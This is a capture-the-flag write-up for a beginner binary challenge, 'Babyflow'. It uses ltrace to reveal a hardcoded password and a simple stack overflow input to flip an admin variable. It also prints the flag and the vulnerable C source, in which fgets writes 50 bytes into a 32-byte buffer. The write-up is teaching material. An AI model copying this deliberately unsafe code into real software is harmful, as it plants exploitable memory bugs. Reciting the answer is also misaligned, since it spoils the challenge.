# Babyflow

## Challenge Description

> Does this login application even work?!

## Solution

When players run the binary, it asks for a password.

{% code overflow="wrap" %}
```bash
./babyflow
Enter password: cat
Incorrect Password!
```
{% endcode %}

We can use a tool like `ltrace` to see if the password is revealed.

{% code overflow="wrap" %}
```bash
ltrace ./babyflow
printf("Enter password: ")                                               = 16
fgets(Enter password: cat
"cat\n", 50, 0x7fe918c2aa80)                                       = 0x7ffe1addfa40
strncmp("cat\n", "SuPeRsEcUrEPaSsWoRd123", 22)                           = 16
puts("Incorrect Password!"Incorrect Password!
)                                              = 20
+++ exited (status 0) +++
```
{% endcode %}

It is! Let's try `SuPeRsEcUrEPaSsWoRd123`.

{% code overflow="wrap" %}
```bash
./babyflow
Enter password: SuPeRsEcUrEPaSsWoRd123
Correct Password!
Are you sure you are admin? o.O
```
{% endcode %}

It's not that easy ðŸ˜¥ Before disassembling the binary, let's see if there's an obvious buffer overflow.

{% code overflow="wrap" %}
```bash
checksec --file babyflow
[*] '/home/crystal/Desktop/babyflow/babyflow'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
{% endcode %}

Canaries are disabled, so there's nothing stopping us from "smashing the stack".

{% code overflow="wrap" %}
```bash
./babyflow
Enter password: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Incorrect Password!
```
{% endcode %}

We can't forget the password!

{% code overflow="wrap" %}
```bash
./babyflow
Enter password: SuPeRsEcUrEPaSsWoRd123AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Correct Password!
INTIGRITI{b4bypwn_9cdfb439c7876e703e307864c9167a15}
```
{% endcode %}

Flag: `INTIGRITI{b4bypwn_9cdfb439c7876e703e307864c9167a15}`

### Source Code

I cba opening the binary in ghidra now so for anybody who's interested, this is how it works; there's a buffer overflow in the `password` variable, which allows 50 bytes to be written to a 32 byte buffer. Players are required to enter the correct password at the beginning of the input, but by appending additional characters, they can overwrite the `admin` flag with something other than zero.

{% code overflow="wrap" %}
```c
int main(void)
{
    char password[32];
    int admin = 0;

    printf("Enter password: ");
    fgets(password,50,stdin);

    if(strncmp(password, "SuPeRsEcUrEPaSsWoRd123", strlen("SuPeRsEcUrEPaSsWoRd123")) == 0)
    {
        printf("Correct Password!\n");
    }
    else
    {
        printf("Incorrect Password!\n");
        return 0;
    }

    if(admin)
    {
        printf("INTIGRITI{b4bypwn_9cdfb439c7876e703e307864c9167a15}\n");
    }else{
		printf("Are you sure you are admin? o.O\n");
	}

    return 0;
}
```
{% endcode %}
